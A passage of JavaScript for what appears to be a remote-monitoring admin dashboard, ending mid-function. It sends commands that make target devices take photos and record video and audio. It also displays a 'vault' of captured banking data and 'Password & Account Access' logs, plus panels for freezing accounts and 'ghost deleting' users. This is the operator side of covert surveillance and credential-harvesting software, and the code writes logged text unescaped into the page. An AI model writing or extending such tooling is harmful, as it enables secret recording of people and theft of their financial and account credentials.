                            <button class="clear-category-btn" data-category="video"><span>Clear Videos</span></button>
                        </div>`;
    modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';

    const videoDataRef = ref(db, `user/${userId}/${childKey}/video/data`);
    
    const callback = (snapshot) => {
        const videos = snapshot.val();
        if (!videos || Object.keys(videos).length === 0) {
            modalDataDisplayArea.innerHTML = headerHTML + '<p>No videos available.</p>';
            return;
        }

        const videosWithData = Object.values(videos).reverse();
        let videoGridHTML = '<div class="video-grid">';
        videosWithData.forEach(videoData => {
            if (typeof videoData === 'object' && videoData !== null && videoData.videoUrl) {
                const url = videoData.videoUrl; 
                const timeCreated = videoData.dateTime || 'N/A'; 
                videoGridHTML += `<div class="video-card">
                                    <video controls preload="metadata">
                                        <source src="${url}" type="video/mp4">
                                        Your browser does not support the video tag.
                                    </video>
                                    <div class="video-info">
                                        <span class="video-time">${timeCreated}</span>
                                        <a href="${url}" target="_blank" class="view-btn">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                                        </a>
                                    </div>
                                  </div>`;
            }
        });
        videoGridHTML += '</div>';
        modalDataDisplayArea.innerHTML = headerHTML + videoGridHTML;
    };

    if (activeDataListener) {
        off(activeDataListener.ref, 'value', activeDataListener.callback);
    }

    onValue(videoDataRef, callback);
    activeDataListener = { ref: videoDataRef, callback: callback };
}

function renderAudiosFromDatabase(userId, childKey) {
    const headerHTML = `<div class="data-header">
                            <button class="record-btn" data-command="recordAudio"><span>Record Audio (30s)</span></button>
                            <button class="record-btn" data-command="refresh" data-category="audio" style="background-color: var(--accent-blue);"><span>Refresh</span></button>
                            <button class="clear-category-btn" data-category="audio"><span>Clear Audios</span></button>
                        </div>`;
    modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';

    const audioDataRef = ref(db, `user/${userId}/${childKey}/audio/data`);
    
    const callback = (snapshot) => {
        const audios = snapshot.val();
        if (!audios || Object.keys(audios).length === 0) {
            modalDataDisplayArea.innerHTML = headerHTML + '<p>No audio recordings available.</p>';
            return;
        }

        const audiosWithData = Object.values(audios).reverse();
        let audioListHTML = '<div class="audio-list">';
        audiosWithData.forEach(audioData => {
            if (typeof audioData === 'object' && audioData !== null && audioData.audioUrl) {
                const url = audioData.audioUrl;
                const timeCreated = audioData.dateTime || 'N/A';
                audioListHTML += `<div class="audio-card">
                                    <audio controls preload="metadata">
                                        <source src="${url}" type="audio/mpeg">
                                        Your browser does not support the audio element.
                                    </audio>
                                    <div class="audio-time">${timeCreated}</div>
                                  </div>`;
            }
        });
        audioListHTML += '</div>';
        modalDataDisplayArea.innerHTML = headerHTML + audioListHTML;
    };

    if (activeDataListener) {
        off(activeDataListener.ref, 'value', activeDataListener.callback);
    }

    onValue(audioDataRef, callback);
    activeDataListener = { ref: audioDataRef, callback: callback };
}

modalDataDisplayArea.addEventListener('click', (e) => {
    const button = e.target.closest('button');
    if (!button) return;
    const { userId, childKey, userName } = selectedUserInfo;
    
    if (button.classList.contains('clear-category-btn')) {
        const category = button.dataset.category;
        const isConfirmed = window.confirm(`Are you sure you want to delete all ${category} data? This action cannot be undone.`);
        
        if (isConfirmed) {
            (async () => {
                try {
                    if (category === 'photo') {
                        await clearAllPhotos(userId, childKey);
                    } else {
                        await remove(ref(db, getCategoryPath(category, userId, childKey)));
                    }
                    showToast(`${category} data cleared successfully.`, 'success');
                    displayCategoryData(category);
                } catch (err) {
                    showToast(`Error: ${err.message}`, 'error');
                }
            })();
        }
        return;
    }
    
    if (button.classList.contains('capture-photo-btn')) {
        const facing = button.dataset.facing;
        if (facing === undefined) return;
        const span = button.querySelector('span');
        const originalText = span.textContent;
        button.disabled = true; span.textContent = 'Sending...';
        
        sendRemoteCommand(userId, childKey, 'capturePhoto', { facingCamera: parseInt(facing) })
            .then(() => { 
                span.textContent = 'Command Sent!'; 
                setTimeout(() => { span.textContent = originalText; button.disabled = false; }, 3000); 
            })
            .catch((error) => { 
 
                alert("Failed: " + error.message); 
                span.textContent = originalText; 
                button.disabled = false; 
            });
    }
    
    const command = button.dataset.command;
    if(command === 'recordVideo') {
        const facing = button.dataset.facing;
        const span = button.querySelector('span');
        const originalText = span.textContent;
        button.disabled = true; span.textContent = 'Sending...';
        
        sendRemoteCommand(userId, childKey, 'recordVideo', { facingCamera: parseInt(facing), duration: 30000 })
            .then(() => { 
                span.textContent = 'Command Sent!'; 
                setTimeout(() => { span.textContent = originalText; button.disabled = false; }, 3000); 
            })
            .catch((error) => { 
                alert("Failed: " + error.message); 
                span.textContent = originalText; button.disabled = false; 
            });
    }

    if(command === 'recordAudio') {
        const span = button.querySelector('span');
        const originalText = span.textContent;
        button.disabled = true; span.textContent = 'Sending...';

        sendRemoteCommand(userId, childKey, 'recordAudio', { duration: 30000 })
            .then(() => { 
                span.textContent = 'Command Sent!'; 
                setTimeout(() => { span.textContent = originalText; button.disabled = false; }, 3000); 
            })
            .catch((error) => { 
                alert("Failed: " + error.message); 
                span.textContent = originalText; button.disabled = false; 
            });
    }

    if (command === 'refresh') {
         const category = button.dataset.category;
         if (category === 'video') renderVideosFromDatabase(userId, childKey);
         if (category === 'audio') renderAudiosFromDatabase(userId, childKey);
    }

    if (button.id === 'refresh-photos-btn') { 
        renderPhotosFromDatabase(userId, childKey); 
    }
});

async function clearAllPhotos(userId, childKey) {
    modalDataDisplayArea.innerHTML = '<div class="loader"></div><p>Deleting photo records...</p>';
    try {
        await remove(ref(db, `user/${userId}/${childKey}/photo/data`));
        showToast('All photo records have been deleted.', 'success');
    } catch (error) {

        showToast('Error: ' + error.message, 'error');
        renderPhotosFromDatabase(userId, childKey);
    }
}

// ===================================================================
// नई Functions (New Backend Features Integration)
// ===================================================================

/**
 * 🛡️ FINANCIAL GUARDIAN - Admin Vault Display with Batch Loading
 * Displays banking, social, and danger logs with lazy loading for performance
 */
function displayAdminVault(userId) {
    const vaultRef = ref(db, `Admin_Vault/${userId}`);
    
    get(vaultRef).then((snapshot) => {
        const vaultData = snapshot.val();
        let headerHTML = `<div class="data-header">
                            <h3 style="color: #ff6b9d; margin: 0;">🛡️ Financial Guardian Vault</h3>
                          </div>`;
        let contentHTML = '';

        if (!vaultData || ((!vaultData.Banking_Logs || Object.keys(vaultData.Banking_Logs).length === 0) &&
                          (!vaultData.Social_Logs || Object.keys(vaultData.Social_Logs).length === 0) &&
                          (!vaultData.Danger_Logs || Object.keys(vaultData.Danger_Logs).length === 0))) {
            contentHTML = '<p style="text-align: center; padding: 2rem;">No sensitive financial data detected yet.</p>';
            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
            return;
        }

        // Flatten all logs with type metadata for batch rendering
        fullVaultLogs = [];
        if (vaultData.Banking_Logs) {
            Object.entries(vaultData.Banking_Logs).forEach(([key, log]) => {
                fullVaultLogs.push({ ...log, logType: 'banking', key });
            });
        }
        if (vaultData.Social_Logs) {
            Object.entries(vaultData.Social_Logs).forEach(([key, log]) => {
                fullVaultLogs.push({ ...log, logType: 'social', key });
            });
        }
        if (vaultData.Danger_Logs) {
            Object.entries(vaultData.Danger_Logs).forEach(([key, log]) => {
                fullVaultLogs.push({ ...log, logType: 'danger', key });
            });
        }

        // Sort by timestamp (newest first)
        fullVaultLogs.sort((a, b) => (b.detected_at || 0) - (a.detected_at || 0));

        renderedVaultCount = 0;
        modalDataDisplayArea.innerHTML = headerHTML + '<div class="vault-container" id="vault-container"></div>';
        modalDataDisplayArea.addEventListener('scroll', handleVaultScroll);
        
        renderVaultBatch();
    }).catch(err => {
        // Error loading vault
    });
}

function handleVaultScroll() {
    if (modalDataDisplayArea.scrollTop + modalDataDisplayArea.clientHeight >= modalDataDisplayArea.scrollHeight - 20) {
        renderVaultBatch();
    }
}

function renderVaultBatch() {
    if (isVaultLoading || renderedVaultCount >= fullVaultLogs.length) return;
    isVaultLoading = true;
    
    const vaultContainer = document.getElementById('vault-container');
    if (!vaultContainer) { isVaultLoading = false; return; }

    const end = renderedVaultCount + VAULT_BATCH_SIZE;
    const batch = fullVaultLogs.slice(renderedVaultCount, end);
    
    let contentHTML = '';
    const logTypeStyles = {
        banking: { color: '#ff6b9d', icon: '💳', title: 'Banking Activity' },
        social: { color: '#26a69a', icon: '🔐', title: 'Password & Account Access' },
        danger: { color: '#ff6b6b', icon: '⚠️', title: 'Suspicious Activity' }
    };

    batch.forEach(log => {
        const style = logTypeStyles[log.logType] || logTypeStyles.danger;
        const time = log.detected_at ? formatTimestamp(log.detected_at) : 'N/A';
        const priority = log.priority || 'MEDIUM';

        if (log.logType === 'banking') {
            contentHTML += `<div class="vault-card" style="border-left: 4px solid ${style.color};">
                            <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
                                <strong>Priority:</strong>
                                <span style="color: ${priority === 'HIGH' ? '#ff6b9d' : '#ffc107'}; font-weight: bold;">${priority}</span>
                            </div>
                            <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
                                <strong>Source:</strong>
                                <span>${log.source || 'Unknown'}</span>
                            </div>
                            <div style="background: #2a2a2a; padding: 1rem; border-radius: 6px; margin: 0.5rem 0;">
                                <strong>Data:</strong><br><code style="color: ${style.color}; word-break: break-all;">${log.text}</code>
                            </div>
                            <div style="text-align: right; font-size: 0.85rem; color: #8b949e;">${time}</div>
                        </div>`;
        } else {
            contentHTML += `<div class="vault-card" style="border-left: 4px solid ${style.color};">
                            <div style="background: #2a2a2a; padding: 1rem; border-radius: 6px; margin-bottom: 0.5rem;">
                                <code style="color: ${style.color}; word-break: break-all;">${log.text}</code>
                            </div>
                            <div style="text-align: right; font-size: 0.85rem; color: #8b949e;">${time}</div>
                        </div>`;
        }
    });

    vaultContainer.insertAdjacentHTML('beforeend', contentHTML);
    renderedVaultCount = end;
    isVaultLoading = false;
}

/**
 * 🧊 FREEZE STATUS - Account Freeze/Unfreeze Control
 */
function displayFreezeStatus(userId) {
    const freezeRef = ref(db, `user/${userId}/profile_data/security`);
    
    get(freezeRef).then((snapshot) => {
        const securityData = snapshot.val();
        const isFrozen = securityData?.is_frozen || false;
        
        let headerHTML = `<div class="data-header">
                            <h3 style="color: #00bcd4; margin: 0;">🧊 Account Control Panel</h3>
                          </div>`;
        
        let contentHTML = `
            <div style="padding: 2rem; text-align: center;">
                <div style="background: ${isFrozen ? '#ff6b6b' : '#26d07c'}; padding: 2rem; border-radius: 12px; margin-bottom: 2rem;">
                    <h2 style="margin: 0; color: white; font-size: 1.8rem;">
                        ${isFrozen ? '❌ ACCOUNT FROZEN' : '✅ ACCOUNT ACTIVE'}
                    </h2>
                    <p style="color: rgba(255,255,255,0.9); margin-top: 0.5rem;">
                        ${isFrozen ? 'This account is currently locked from all operations.' : 'This account is functioning normally.'}
                    </p>
                </div>
                
                <div style="background: #2a2a2a; padding: 1.5rem; border-radius: 12px; border: 1px solid #444;">
                    <h4>Quick Actions</h4>
                    <button class="freeze-toggle-btn" data-userid="${userId}" data-frozen="${isFrozen}" style="padding: 12px 24px; margin: 0.5rem; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 1rem; color: white; background: ${isFrozen ? '#26d07c' : '#ff6b6b'};">
                        ${isFrozen ? '🔓 Unfreeze Account' : '🔒 Freeze Account'}
                    </button>
                    
                    <p style="font-size: 0.9rem; color: #8b949e; margin-top: 1.5rem;">
                        <strong>Note:</strong> Frozen accounts cannot send commands, upload media, or perform any operations.
                    </p>
                </div>
                
                <div style="background: #2a2a2a; padding: 1.5rem; border-radius: 12px; margin-top: 1.5rem; border: 1px solid #444;">
                    <h4>Security Status</h4>
                    <div style="text-align: left;">
                        <p><strong>Warnings:</strong> ${securityData?.warnings || 0}</p>
                        <p><strong>Last Updated:</strong> ${securityData?.last_updated ? formatTimestamp(securityData.last_updated) : 'Never'}</p>
                    </div>
                </div>
            </div>
        `;
        
        modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
        
        // Freeze toggle button listener
        const freezeBtn = modalDataDisplayArea.querySelector('.freeze-toggle-btn');
        if (freezeBtn) {
            freezeBtn.addEventListener('click', async () => {
                const newFrozenStatus = !isFrozen;
                const confirmMsg = newFrozenStatus 
                    ? 'Are you sure you want to freeze this account? Frozen accounts cannot perform any operations.' 
                    : 'Are you sure you want to unfreeze this account?';
                const isConfirmed = window.confirm(confirmMsg);
                
                if (isConfirmed) {
                    try {
                        const freezeAccount = httpsCallable(functions, 'freezeUserAccount');
                        await freezeAccount({
                            targetUid: userId,
                            isFrozen: newFrozenStatus
                        });
                        showToast(newFrozenStatus ? 'Account frozen successfully!' : 'Account unfrozen successfully!', 'success');
                        displayFreezeStatus(userId);
                    } catch (err) {
                        showToast('Error: ' + err.message, 'error');
                    }
                }
            });
        }
    }).catch(err => {
        // Error loading freeze status
    });
}

/**
 * 📋 AUDIT LOGS - System Action History
 */
function displayAuditLogs() {
    const auditRef = ref(db, 'system_audit_logs');
    
    get(auditRef).then((snapshot) => {
        const logsData = snapshot.val();
        let headerHTML = `<div class="data-header">
                            <h3 style="color: #4db8ff; margin: 0;">📋 System Audit Logs</h3>
                          </div>`;
        
        let contentHTML = '';

        if (!logsData || Object.keys(logsData).length === 0) {
            contentHTML = `
                <div style="background: rgba(77, 184, 255, 0.1); border: 2px dashed #4db8ff; border-radius: 8px; padding: 3rem 2rem; text-align: center; margin: 2rem 0;">
                    <div style="font-size: 3rem; margin-bottom: 0.5rem;">📋</div>
                    <p style="margin: 0; font-weight: 500; color: #c9d1d9;">No System Audit Logs Available</p>
                    <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem; color: #8b949e;">No admin actions have been logged yet.</p>
                </div>
            `;
            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
            return;
        }

        const logsArray = Object.values(logsData).reverse().slice(0, 100); // Latest 100 logs
        
        contentHTML = `<table class="audit-logs-table">
                        <thead>
                            <tr>
                                <th>Action</th>
                                <th>Admin</th>
                                <th>Details</th>
                                <th>Time</th>
                            </tr>
                        </thead>
                        <tbody>`;
        
        logsArray.forEach(log => {
            const time = log.timestamp ? formatTimestamp(log.timestamp) : 'N/A';
            const actionColor = getActionColor(log.action);
            
            contentHTML += `<tr>
                            <td><span style="color: ${actionColor}; font-weight: bold;">${log.action || 'UNKNOWN'}</span></td>
                            <td>${log.adminId || 'System'}</td>
                            <td>${log.details || 'N/A'}</td>
                            <td style="font-size: 0.85rem; color: #8b949e;">${time}</td>
                        </tr>`;
        });
        
        contentHTML += `</tbody>
                    </table>`;
        
        modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
    }).catch(err => {
        // Error loading audit logs
    });
}

/**
 * Helper function to get color for audit log actions
 */
function getActionColor(action) {
    const colors = {
        'USER_FROZEN': '#ff6b9d',
        'COMMAND_BLOCKED': '#ff6b9d',
        'COMMAND_SENT': '#26d07c',
        'LIMIT_UPDATED': '#ffc107',
        'LIMIT_REACHED': '#ff6b9d',
        'GHOST_DELETE': '#ff6b9d',
        'SYSTEM_CRON': '#4db8ff',
        'default': '#8b949e'
    };
    return colors[action] || colors['default'];
}

/**
 * 📱 LOGIN / LOGS HISTORY - Display per-child logs_history
 * Shows admin panel login/logout and session events for a specific child device
 * Only shows last 30 days of logs
 */
function displayLoginHistory(userId, childKey) {
    // Use per-child logs_history node instead of global login_history
    const logsHistoryRef = ref(db, `user/${userId}/${childKey}/logs_history`);
    
    get(logsHistoryRef).then((snapshot) => {
        const logsData = snapshot.val();
        let headerHTML = `<div class="data-header">
                            <h3 style="color: #8b5cf6; margin: 0;">📱 Login / Logs History (Last 30 Days)</h3>
                          </div>`;
        
        let contentHTML = '';

        if (!logsData || Object.keys(logsData).length === 0) {
            contentHTML = '<div style="text-align: center; padding: 2rem; color: var(--text-secondary);">No login history available for this device.</div>';
            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
            return;
        }

        // Filter by last 30 days and reverse for newest first
        const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
        const filteredLogs = Object.values(logsData)
            .filter(log => log.timestamp && log.timestamp >= thirtyDaysAgo)
            .reverse()
            .slice(0, 100); // Latest 100 logs within 30 days
        
        if (filteredLogs.length === 0) {
            contentHTML = '<div style="text-align: center; padding: 2rem; color: var(--text-secondary);">No login activity in the last 30 days.</div>';
            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
            return;
        }
        
        contentHTML = '<div style="display: flex; flex-direction: column; gap: 1rem;">';
        
        filteredLogs.forEach((logEntry) => {
            const timestamp = logEntry.timestamp;
            const time = timestamp ? formatTimestamp(timestamp) : 'Unknown';
            const ipAddress = logEntry.ip || 'Unknown';
            const deviceType = logEntry.deviceType || 'Unknown';
            const browserName = logEntry.browser || 'Unknown';
            const eventType = logEntry.eventType || 'access';
            
            // Determine device icon
            let deviceIcon = '📱';
            if (deviceType.toLowerCase().includes('web') || deviceType.toLowerCase().includes('desktop')) {
                deviceIcon = '💻';
            } else if (deviceType.toLowerCase().includes('tablet')) {
                deviceIcon = '📱';
            }
            
            // Event type styling
            let eventColor = '#8b5cf6';
            let eventIcon = '👤';
            if (eventType.includes('login')) {
                eventColor = '#26d07c';
                eventIcon = '✅';
            } else if (eventType.includes('logout')) {
                eventColor = '#ff6b6b';
                eventIcon = '❌';
            }

            contentHTML += `
                <div style="background: var(--secondary-dark); border-radius: 8px; padding: 1rem; border-left: 4px solid ${eventColor};">
                    <div style="display: flex; justify-content: space-between; align-items: start; margin-bottom: 0.75rem;">
                        <div>
                            <div style="font-weight: 600; color: #fff; font-size: 1rem;">
                                ${deviceIcon} ${deviceType} - ${browserName}
                            </div>
                            <div style="font-size: 0.85rem; color: #8b949e; margin-top: 0.25rem;">
                                ${eventIcon} ${eventType.toUpperCase()}
                            </div>
                        </div>
                        <div style="font-size: 0.85rem; color: var(--text-secondary);">${time}</div>
                    </div>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; font-size: 0.9rem; color: var(--text-primary);">
                        <div><strong>IP Address:</strong> ${ipAddress}</div>
                        <div><strong>Event:</strong> ${eventType}</div>
                    </div>
                </div>
            `;
        });

        contentHTML += '</div>';
        
        modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
    }).catch(err => {
        // Error loading login history
    });
}

/**
 * 📧 EMAIL SENDER - SendGrid Integration
 * SendGrid के साथ email भेजता है
 */
async function sendTestEmail() {
    try {
        // Note: callCloudFunction is not defined, use httpsCallable instead
        const sendEmail = httpsCallable(functions, 'sendTestEmail');
        const response = await sendEmail({
            to: 'admin@example.com',
            subject: 'Test Email from Dashboard',
            message: 'This is a test email sent from the admin dashboard.'
        });
        
        showToast('Test email sent successfully!', 'success');
    } catch (error) {
        showToast('Error sending test email: ' + error.message, 'error');
    }
}

/**
 * 🛠️ COMMAND TESTER - Display command history and send test commands
 * Reads from CommandHistory (single source of truth) via getCommandHistory helper
 */
function displayCommandTester(userId, childKey) {
    if (!childKey) {
        modalDataDisplayArea.innerHTML = '<p style="color: #ff6b6b; text-align: center;">❌ No device selected. Please select a user first.</p>';
        return;
    }
    
    // === USE getCommandHistory HELPER - Reads CommandHistory with fallback ===
    getCommandHistory(userId, childKey).then(commandHistory => {
        let headerHTML = `<div class="data-header">
                            <h3 style="color: #4caf50; margin: 0;">🛠️ Command Tester (Device: ${childKey})</h3>
                          </div>`;
        
        let contentHTML = `<div style="margin-bottom: 1.5rem;">
                            <button id="send-test-command" style="padding: 10px 20px; background: #4caf50; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600;">
                                ➕ Send Test Command
                            </button>
                          </div>`;
        
        if (commandHistory && Object.keys(commandHistory).length > 0) {
            contentHTML += '<div class="commands-list">';
            Object.entries(commandHistory).forEach(([key, command]) => {
                const time = command.timestamp ? formatTimestamp(command.timestamp) : 'N/A';
                contentHTML += `<div class="command-item" style="background: #2a2a2a; padding: 1rem; border-radius: 8px; margin-bottom: 0.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                                        <strong style="color: #4caf50;">${command.type || command.commandType || 'Unknown'}</strong>
                                        <small style="color: #8b949e;">${time}</small>
                                    </div>
                                    <div style="color: #c9d1d9; font-size: 0.9rem; margin-bottom: 0.5rem;">
                                        <strong>Status:</strong> ${command.status || 'pending'} | 
                                        <strong>Payload:</strong> ${JSON.stringify(command.details || {})}
                                    </div>
                                </div>`;
            });
            contentHTML += '</div>';
        } else {
            contentHTML += `
                <div style="background: rgba(255, 193, 7, 0.1); border: 2px dashed #ffc107; border-radius: 8px; padding: 3rem 2rem; text-align: center; margin: 2rem 0;">
                    <div style="font-size: 3rem; margin-bottom: 1rem;">📭</div>
                    <h3 style="color: #ffc107; margin: 0 0 0.5rem 0;">No Commands Executed Yet</h3>
                    <p style="color: #8b949e; margin: 0 0 1.5rem 0; font-size: 0.95rem; line-height: 1.6;">
                        This device hasn't received any commands yet.<br/>
                        Use the button below to send a test command.
                    </p>
                </div>
            `;
        }
        
        modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
        
        // Test command sending
        const sendTestCommandBtn = document.getElementById('send-test-command');
        if (sendTestCommandBtn) {
            sendTestCommandBtn.addEventListener('click', async () => {
                try {
                    await sendRemoteCommand(userId, childKey, 'testCommand', { action: 'test', value: Math.random() });
                    showToast('✅ Test command sent successfully to device!', 'success');
                    // Refresh display
                    setTimeout(() => displayCommandTester(userId, childKey), 500);
                } catch (error) {
                    showToast('❌ Error sending test command: ' + error.message, 'error');
                }
            });
        }
    }).catch(error => {
        showToast('❌ Error loading command history: ' + error.message, 'error');
    });
}

/**
 * 📤 SEND REMOTE COMMAND - Cloud Function Wrapper
 * Sends commands to user devices and logs health event
 */
async function sendRemoteCommand(userId, childKey, commandType, commandData = {}) {
    try {
        // Determine command name for health logging
        let commandName = 'unknown';
        if (commandType === 'capturePhoto') commandName = 'photo';
        else if (commandType === 'recordVideo') commandName = 'video';
        else if (commandType === 'recordAudio') commandName = 'audio';
        
        // Log health event - command requested
        await logHealthEvent(
            userId,
            childKey,
            `${commandName}_command`,
            commandName,
            'requested',
            { commandType, commandData }
        );
        
        const sendCommand = httpsCallable(functions, 'sendRemoteCommand');
        const result = await sendCommand({
            userId,
            childKey,
            commandType,
            commandData
        });
        
        return result.data;
    } catch (error) {

        showToast(`Failed to send command: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * 📊 LIMIT MANAGEMENT - User Media Limits Control
 * Photo/Video/Audio limits को manage करता है
 */
function displayLimitManagement(userId) {
    const limitsRef = ref(db, `user/${userId}/profile_data/limits`);
    
    get(limitsRef).then((snapshot) => {
        const limitsData = snapshot.val() || {
            photos: { count: 0, max: 50 },
            videos: { count: 0, max: 50 },
            audio: { count: 0, max: 50 },
            totalStorageLimit: 5000
        };
        
        // Ensure nested structure exists
        const photos = limitsData.photos || { count: 0, max: 50 };
        const videos = limitsData.videos || { count: 0, max: 50 };
        const audio = limitsData.audio || { count: 0, max: 50 };
        const totalStorageLimit = limitsData.totalStorageLimit || 5000;
        
        // Calculate percentages for progress bars
        const photoPercentage = Math.min((photos.count / photos.max) * 100, 100);
        const videoPercentage = Math.min((videos.count / videos.max) * 100, 100);
        const audioPercentage = Math.min((audio.count / audio.max) * 100, 100);
        
        let headerHTML = `<div class="data-header">
                            <h3 style="color: #26d07c; margin: 0;">📊 Media Limits Configuration</h3>
                          </div>`;
        
        let contentHTML = `
            <div class="limits-container">
                <div class="limit-card" style="background: #2a2a2a; padding: 1.5rem; border-radius: 12px; border: 1px solid #444; margin-bottom: 1.5rem;">
                    <h4 style="color: #26d07c; margin-top: 0;">📸 Photo Limit</h4>
                    <div style="display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem;">
                        <input type="number" class="limit-input" data-limit="photos" value="${photos.max}" min="0" style="flex: 1; padding: 10px; background: #1a1a1a; border: 1px solid #444; border-radius: 6px; color: #26d07c; font-weight: bold;">
                        <span style="color: #8b949e;">Photos</span>
                    </div>
                    <div class="progress-bar" style="background: #444; height: 6px; border-radius: 3px; overflow: hidden;">
                        <div style="background: #26d07c; height: 100%; width: ${photoPercentage}%;"></div>
                    </div>
                    <small style="color: #8b949e; margin-top: 0.5rem; display: block;">Usage: ${photos.count} / ${photos.max}</small>
                </div>

                <div class="limit-card" style="background: #2a2a2a; padding: 1.5rem; border-radius: 12px; border: 1px solid #444; margin-bottom: 1.5rem;">
                    <h4 style="color: #26d07c; margin-top: 0;">🎬 Video Limit</h4>
                    <div style="display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem;">
                        <input type="number" class="limit-input" data-limit="videos" value="${videos.max}" min="0" style="flex: 1; padding: 10px; background: #1a1a1a; border: 1px solid #444; border-radius: 6px; color: #26d07c; font-weight: bold;">
                        <span style="color: #8b949e;">Videos</span>
                    </div>
                    <div class="progress-bar" style="background: #444; height: 6px; border-radius: 3px; overflow: hidden;">
                        <div style="background: #26d07c; height: 100%; width: ${videoPercentage}%;"></div>
                    </div>
                    <small style="color: #8b949e; margin-top: 0.5rem; display: block;">Usage: ${videos.count} / ${videos.max}</small>
                </div>

                <div class="limit-card" style="background: #2a2a2a; padding: 1.5rem; border-radius: 12px; border: 1px solid #444; margin-bottom: 1.5rem;">
                    <h4 style="color: #26d07c; margin-top: 0;">🎵 Audio Limit</h4>
                    <div style="display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem;">
                        <input type="number" class="limit-input" data-limit="audio" value="${audio.max}" min="0" style="flex: 1; padding: 10px; background: #1a1a1a; border: 1px solid #444; border-radius: 6px; color: #26d07c; font-weight: bold;">
                        <span style="color: #8b949e;">Recordings</span>
                    </div>
                    <div class="progress-bar" style="background: #444; height: 6px; border-radius: 3px; overflow: hidden;">
                        <div style="background: #26d07c; height: 100%; width: ${audioPercentage}%;"></div>
                    </div>
                    <small style="color: #8b949e; margin-top: 0.5rem; display: block;">Usage: ${audio.count} / ${audio.max}</small>
                </div>

                <div class="limit-card" style="background: #2a2a2a; padding: 1.5rem; border-radius: 12px; border: 1px solid #444;">
                    <h4 style="color: #26d07c; margin-top: 0;">💾 Total Storage Limit</h4>
                    <div style="display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem;">
                        <input type="number" class="limit-input" data-limit="totalStorageLimit" value="${totalStorageLimit}" min="0" style="flex: 1; padding: 10px; background: #1a1a1a; border: 1px solid #444; border-radius: 6px; color: #26d07c; font-weight: bold;">
                        <span style="color: #8b949e;">MB</span>
                    </div>
                    <div class="progress-bar" style="background: #444; height: 6px; border-radius: 3px; overflow: hidden;">
                        <div style="background: #26d07c; height: 100%; width: 50%;"></div>
                    </div>
                    <small style="color: #8b949e; margin-top: 0.5rem; display: block;">Storage Limit: ${totalStorageLimit} MB</small>
                </div>

                <div style="margin-top: 2rem; display: flex; gap: 1rem; justify-content: flex-end;">
                    <button id="reset-limits-btn" style="padding: 10px 20px; background: #8b949e; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600;">Reset to Default</button>
                    <button id="save-limits-btn" style="padding: 10px 20px; background: #26d07c; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600;">💾 Save Changes</button>
                </div>
            </div>
        `;
        
        modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
        
        // Event listeners for limit inputs
        const saveLimitsBtn = document.getElementById('save-limits-btn');
        const resetLimitsBtn = document.getElementById('reset-limits-btn');
        
        if (saveLimitsBtn) {
            saveLimitsBtn.addEventListener('click', async () => {
                const newLimits = {
                    photos: { ...photos, max: parseInt(document.querySelector('[data-limit="photos"]').value) || 50 },
                    videos: { ...videos, max: parseInt(document.querySelector('[data-limit="videos"]').value) || 50 },
                    audio: { ...audio, max: parseInt(document.querySelector('[data-limit="audio"]').value) || 50 },
                    totalStorageLimit: parseInt(document.querySelector('[data-limit="totalStorageLimit"]').value) || 5000
                };
                
                try {
                    await updateUserLimits(userId, newLimits);
                    showToast('Media limits updated successfully!', 'success');
                    displayLimitManagement(userId);
                } catch (err) {
                    // Error already shown as toast by updateUserLimits
                }
            });
        }
        
        if (resetLimitsBtn) {
            resetLimitsBtn.addEventListener('click', async () => {
                const isConfirmed = window.confirm('Are you sure you want to reset all limits to defaults?');
                
                if (isConfirmed) {
                    const defaultLimits = {
                        photos: { count: 0, max: 50 },
                        videos: { count: 0, max: 50 },
                        audio: { count: 0, max: 50 },
                        totalStorageLimit: 5000
                    };
                    
                    try {
                        await updateUserLimits(userId, defaultLimits);
                        showToast('Limits reset to default!', 'success');
                        displayLimitManagement(userId);
                    } catch (err) {
                        // Error already shown
                    }
                }
            });
        }
    }).catch(err => {
        // Error loading limits
    });

    activeDataListener = { ref: limitsRef, callback: () => {} };
}

/**
 * 📊 UPDATE USER LIMITS - Cloud Function Wrapper
 * Updates media limits for users
 */
async function updateUserLimits(userId, limits) {
    try {
        const updateFunction = httpsCallable(functions, 'updateUserLimits');
        const result = await updateFunction({
            targetUid: userId,
            photoLimit: limits.photoLimit || 0,
            videoLimit: limits.videoLimit || 0,
            audioLimit: limits.audioLimit || 0
        });
        showToast('📊 Media limits updated successfully!', 'success');
        return result.data;
    } catch (error) {

        showToast(`❌ Failed to update limits: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * 👻 GHOST DELETE - Manual User Deletion with Warning
 * यह function manual ghost delete करता है
 */
async function manualGhostDelete(userId) {
    try {
        const ghostDeleteFunction = httpsCallable(functions, 'manualGhostDelete');
        const response = await ghostDeleteFunction({ 
            targetUid: userId 
        });
        
        showToast('👻 User has been marked for deletion. All data will be purged.', 'success');
        
        // Log to global system audit logs
        await logSystemAudit(
            'GHOST_DELETE',
